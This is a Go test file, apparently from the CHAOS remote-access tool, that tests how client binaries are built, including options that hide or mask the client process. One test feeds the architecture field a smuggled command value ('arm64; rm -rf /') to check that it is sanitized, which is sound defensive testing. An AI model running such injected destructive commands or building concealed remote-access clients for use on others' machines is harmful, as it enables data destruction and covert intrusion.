package client

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
)

type fakeBuildAuthService struct{}

func (fakeBuildAuthService) GetSecret() (string, error) { return "test-secret", nil }
func (fakeBuildAuthService) RefreshSecret() (string, error) {
	return "test-secret", nil
}
func (fakeBuildAuthService) GetAuthConfig() (*entities.Auth, error) {
	return &entities.Auth{SecretKey: "test-secret"}, nil
}

func TestGetEnvVarBuild(t *testing.T) {
	env := getEnvVarBuild("darwin", "arm64")

	for _, expected := range []string{"GOOS=darwin", "GOARCH=arm64", "CGO_ENABLED=0"} {
		if !strings.Contains(env, expected) {
			t.Errorf("getEnvVarBuild() = %q, want it to contain %q", env, expected)
		}
	}

	if system.DetectOS() == system.Windows {
		if !strings.HasSuffix(env, "&") {
			t.Errorf("getEnvVarBuild() = %q, want it to end with a command separator", env)
		}
	} else if strings.Contains(env, "&") {
		t.Errorf("getEnvVarBuild() = %q, want no command separator", env)
	}
}

func TestBuildFilename(t *testing.T) {
	if got := buildFilename(system.Windows, "agent", false); got != "agent.exe" {
		t.Errorf("buildFilename(Windows) = %q, want %q", got, "agent.exe")
	}
	if got := buildFilename(system.Darwin, "agent", false); got != "agent" {
		t.Errorf("buildFilename(Darwin) = %q, want %q", got, "agent")
	}
	if got := buildFilename(system.Linux, "agent", false); got != "agent" {
		t.Errorf("buildFilename(Linux) = %q, want %q", got, "agent")
	}
}

func TestBuildFilenameDefaultsForHiddenClients(t *testing.T) {
	if got := buildFilename(system.Linux, "", true); got != hiddenLinuxFilename {
		t.Errorf("buildFilename(Linux, hidden) = %q, want %q", got, hiddenLinuxFilename)
	}
	if got := buildFilename(system.Darwin, "", true); got != hiddenMacFilename {
		t.Errorf("buildFilename(Darwin, hidden) = %q, want %q", got, hiddenMacFilename)
	}
	if got := buildFilename(system.Linux, "", false); got == hiddenLinuxFilename {
		t.Errorf("buildFilename(Linux, visible) = %q, want a random name", got)
	}
	if got := buildFilename(system.Windows, "", true); !strings.HasSuffix(got, ".exe") || got == ".exe" {
		t.Errorf("buildFilename(Windows, hidden) = %q, want a random .exe name", got)
	}
}

func TestGetBuildFlags(t *testing.T) {
	tests := []struct {
		name   string
		target system.OSType
		hidden bool
		mask   bool
		want   string
	}{
		{"windows hidden", system.Windows, true, true, "-H=windowsgui"},
		{"linux hidden", system.Linux, true, false, "-X 'main.RunHidden=true'"},
		{"darwin masked", system.Darwin, false, true, "-X 'main.MaskName=true'"},
		{"linux hidden and masked", system.Linux, true, true, "-X 'main.RunHidden=true' -X 'main.MaskName=true'"},
		{"windows visible", system.Windows, false, false, ""},
		{"linux visible", system.Linux, false, false, ""},
	}

	for _, test := range tests {
		if got := getBuildFlags(test.target, test.hidden, test.mask); got != test.want {
			t.Errorf("%s: getBuildFlags() = %q, want %q", test.name, got, test.want)
		}
	}
}

func TestBuildClientBinaryInputGetOSArch(t *testing.T) {
	input := BuildClientBinaryInput{OSTarget: system.Darwin}
	if got := input.GetOSArch(); got != "amd64" {
		t.Errorf("GetOSArch() = %q, want the default %q", got, "amd64")
	}

	input.OSArch = "arm64"
	if got := input.GetOSArch(); got != "arm64" {
		t.Errorf("GetOSArch() = %q, want %q", got, "arm64")
	}

	input.OSArch = "arm64; rm -rf /"
	if got := input.GetOSArch(); got != "arm64rmrf" {
		t.Errorf("GetOSArch() = %q, want sanitized %q", got, "arm64rmrf")
	}
}

func TestBuildClientForDarwin(t *testing.T) {
	workingDir, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	rootDir := filepath.Join(workingDir, "..", "..")
	if err := os.Chdir(rootDir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(workingDir) })

	service := NewClientService(
		"test",
		&environment.Configuration{Server: environment.Server{Port: "8080"}},
		nil,
		fakeBuildAuthService{},
	)

	filename, err := service.BuildClient(BuildClientBinaryInput{
		ServerAddress: "127.0.0.1",
		ServerPort:    "8080",
		OSTarget:      system.Darwin,
		OSArch:        "arm64",
		Filename:      "chaosdarwintest",
	})
	if err != nil {
		t.Fatalf("BuildClient() error = %v", err)
	}
	t.Cleanup(func() { _ = os.Remove(filepath.Join("temp", filename)) })

	if filename != "chaosdarwintest" {
		t.Errorf("BuildClient() filename = %q, want %q", filename, "chaosdarwintest")
	}
	if _, err := os.Stat(filepath.Join("temp", filename)); err != nil {
		t.Errorf("built client was not written to the temp directory: %v", err)
	}

	output, err := os.ReadFile(filepath.Join("temp", filename))
	if err != nil {
		t.Fatal(err)
	}
	machoMagic := []byte{0xCF, 0xFA, 0xED, 0xFE}
	if len(output) < len(machoMagic) || !bytes.Equal(output[:len(machoMagic)], machoMagic) {
		t.Errorf("built client does not have a Mach-O header, got %x", output[:4])
	}
}

func TestBuildClientRejectsInvalidArch(t *testing.T) {
	service := NewClientService("test", &environment.Configuration{}, nil, fakeBuildAuthService{})

	_, err := service.BuildClient(BuildClientBinaryInput{
		ServerAddress: "127.0.0.1",
		ServerPort:    "8080",
		OSTarget:      system.Windows,
		OSArch:        "arm64",
	})
	if err != internal.ErrInvalidOSArch {
		t.Errorf("BuildClient() error = %v, want %v", err, internal.ErrInvalidOSArch)
	}
}
